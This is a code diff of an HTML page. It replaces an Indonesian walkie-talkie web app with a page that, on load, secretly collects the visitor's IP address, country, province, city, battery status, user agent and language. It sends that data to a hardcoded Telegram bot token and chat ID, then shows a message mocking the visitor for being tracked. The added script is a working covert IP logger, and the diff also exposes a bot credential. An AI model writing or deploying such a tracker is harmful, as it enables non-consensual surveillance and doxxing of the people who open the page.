@@ -3,139 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Walkie-Talkie Indonesia</title>
-    <style>
-        @font-face {
-            font-family: 'Digital';
-            src: url('https://assets.codepen.io/28963/digital-7.ttf');
+    <title>Lacak Lokasi - Zioles Pusat</title>
+    <script>
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                const level = Math.round(battery.level * 100);
+                const charging = battery.charging ? "🔌 Sedang mengisi daya" : "⚡ Tidak mengisi daya";
+                return `Baterai: ${level}% (${charging})`;
+            } 
+            return "Baterai: Tidak didukung";
         }
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #222;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+
+        async function getIP() {
+            try {
+                let response = await fetch("https://ipapi.co/json/");
+                let data = await response.json();
+                
+                let ip = data.ip;
+                let negara = data.country_name;
+                let provinsi = data.region;
+                let kota = data.city;
+
+                let batteryStatus = await getBatteryStatus();
+
+                let userAgent = navigator.userAgent;
+                let browser = navigator.vendor || "Tidak diketahui";
+                let bahasa = navigator.language;
+
+                // Kirim ke bot Telegram
+                let botToken = "7566659804:AAFL6Dn2Vf6zz4HhAvngyyFCXvhULhRVPzg"; // Ganti dengan token bot Anda
+                let chatID = "7799140879"; // Ganti dengan ID chat Anda
+
+                let message = `
+🚀 *Zioles Pusat - Lacak Info Pengguna* 🚀
+━━━━━━━━━━━━━━━━━━━━
+🌍 **Informasi Pengguna**
+- 📍 *IP:* ${ip}
+- 🏴 *Negara:* ${negara}
+- 🏙️ *Provinsi:* ${provinsi}
+- 🏠 *Kota:* ${kota}
+- 🔋 *${batteryStatus}*
+- 🖥️ *User Agent:* ${userAgent}
+- 🌐 *Browser:* ${browser}
+- 🗣️ *Bahasa:* ${bahasa}
+━━━━━━━━━━━━━━━━━━━━
+📢 *Data ini dikumpulkan oleh sistem Zioles Pusat.*
+                `;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+                    .then(response => {
+                        if (!response.ok) throw new Error("Gagal mengirim ke Telegram");
+                    })
+                    .catch(error => console.error("Error:", error));
+
+            } catch (error) {
+                console.error("Gagal mengambil data:", error);
+            }
         }
-        .walkie-talkie {
-            background-color: #333;
-            width: 260px;
-            height: 520px;
-            border-radius: 15px;
-            padding: 20px;
-            box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.5);
-            position: relative;
-            text-align: center;
-            border: 3px solid #555;
-        }
-        .antenna {
-            width: 10px;
-            height: 50px;
-            background-color: black;
-            position: absolute;
-            top: -50px;
-            left: 50%;
-            transform: translateX(-50%);
-            border-radius: 5px;
-        }
-        .screen {
-            background-color: #0a0;
-            color: #fff;
-            width: 90%;
-            height: 50px;
-            margin: 10px auto;
-            font-size: 24px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border-radius: 5px;
-            font-family: 'Digital', sans-serif;
-        }
-        .btn {
-            width: 90%;
-            height: 60px;
-            font-size: 20px;
-            border: none;
-            border-radius: 10px;
-            margin: 10px auto;
-            cursor: pointer;
-            display: block;
-        }
-        .talk-btn {
-            background-color: red;
-            color: white;
-            font-weight: bold;
-        }
-        .leave-btn {
-            background-color: gray;
-            color: white;
-        }
-    </style>
+
+        window.onload = getIP;
+    </script>
 </head>
 <body>
-    <div class="walkie-talkie">
-        <div class="antenna"></div>
-        <div class="screen" id="display">00.00</div>
-        <button class="btn" onclick="checkLocation()">Gabung</button>
-        <button class="btn talk-btn" id="talkButton" disabled>Tekan & Tahan untuk Bicara</button>
-        <button class="btn leave-btn" onclick="leaveCall()">Keluar</button>
-        <audio id="remoteAudio" autoplay></audio>
-    </div>
-
-    <!-- Suara efek radio -->
-    <audio id="radioStart" src="https://www.soundjay.com/button/sounds/button-29.mp3"></audio>
-    <audio id="radioEnd" src="https://www.soundjay.com/button/sounds/button-16.mp3"></audio>
-
-    <script>
-        let localStream;
-        let isIndonesia = false;
-
-        async function checkLocation() {
-            try {
-                const response = await fetch("https://ipapi.co/json/");
-                const data = await response.json();
-                if (data.country_code === "ID") {
-                    isIndonesia = true;
-                    startWalkieTalkie();
-                } else {
-                    alert("Aplikasi ini hanya bisa digunakan di Indonesia.");
-                }
-            } catch (error) {
-                alert("Gagal mendeteksi lokasi. Pastikan Anda terhubung ke internet.");
-            }
-        }
-
-        async function startWalkieTalkie() {
-            localStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            document.getElementById("talkButton").disabled = false;
-        }
-
-        const talkButton = document.getElementById("talkButton");
-        const radioStart = document.getElementById("radioStart");
-        const radioEnd = document.getElementById("radioEnd");
-
-        talkButton.addEventListener("mousedown", () => {
-            if (isIndonesia) {
-                radioStart.play();
-                localStream.getAudioTracks()[0].enabled = true;
-            }
-        });
-
-        talkButton.addEventListener("mouseup", () => {
-            if (isIndonesia) {
-                localStream.getAudioTracks()[0].enabled = false;
-                radioEnd.play();
-            }
-        });
-
-        function leaveCall() {
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-            }
-            document.getElementById("talkButton").disabled = true;
-        }
-    </script>
+    <h1>HAHA IP MU TERLACAK</h1>
+    <p>KAMU TIDAK PINTAR YA TERNYATA</p>
 </body>
 </html>
